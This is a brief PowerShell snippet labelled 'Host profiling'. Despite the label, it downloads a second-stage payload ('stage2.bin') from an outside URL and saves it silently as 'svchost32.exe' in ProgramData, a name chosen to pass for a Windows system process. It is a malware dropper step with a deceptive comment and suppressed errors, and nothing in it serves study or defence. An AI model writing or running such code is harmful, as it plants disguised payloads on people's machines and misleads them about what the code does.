
<# Host profiling #> $TransferUrl = 'http://example.org/cdn/stage2.bin'; $WorkingPath = 'C:\ProgramData\svchost32.exe'; Invoke-WebRequest -Uri $TransferUrl -OutFile $WorkingPath -UseBasicParsing -ErrorAction SilentlyContinue; $ProgressPreference = "SilentlyContinue"
